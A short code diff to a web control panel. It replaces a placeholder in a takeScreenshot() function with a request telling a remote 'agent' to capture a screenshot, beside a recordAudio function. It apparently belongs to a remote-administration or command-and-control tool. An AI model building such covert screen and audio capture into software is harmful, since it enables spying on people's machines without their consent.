@@ -1172,8 +1172,22 @@
         }
 
         function takeScreenshot() {
-            alert(`Screenshot captured from agent ${currentClientId}`);
-            logAction(`Captured screenshot from ${currentClientId}`);
+            fetch('/input-command-to-execute-from-web', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientid: currentClientId, command: "screenshot" })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status) {
+                        alert(data.status);
+                    }
+                })
+                .catch(error => {
+                    alert("Failed to send the command. Please try again.");
+                    console.error('Error:', error);
+                });
+
         }
 
         function recordAudio() {
